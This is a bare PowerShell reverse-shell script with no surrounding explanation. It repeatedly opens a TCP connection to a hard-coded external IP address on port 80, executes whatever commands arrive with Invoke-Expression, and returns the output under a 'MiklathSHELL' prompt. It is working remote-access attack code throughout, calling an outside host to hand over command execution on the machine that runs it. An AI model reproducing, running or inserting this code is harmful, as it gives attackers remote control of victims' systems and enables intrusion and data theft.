while ($True) {
    $daip = "139.162.197.217";
    $daport = 80;
    $client = New-Object System.Net.Sockets.TCPClient($daip, $daport);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|ForEach-Object{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (Invoke-Expression $data 2>&1 | Out-String );$sendback2 = $sendback + "MiklathSHELL " + (Get-Location).Path + "> ";
        $sugmammadin = "ASCII";
        $sendbyte = ([text.encoding]::$sugmammadin).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    };
    $client.Close();
    
}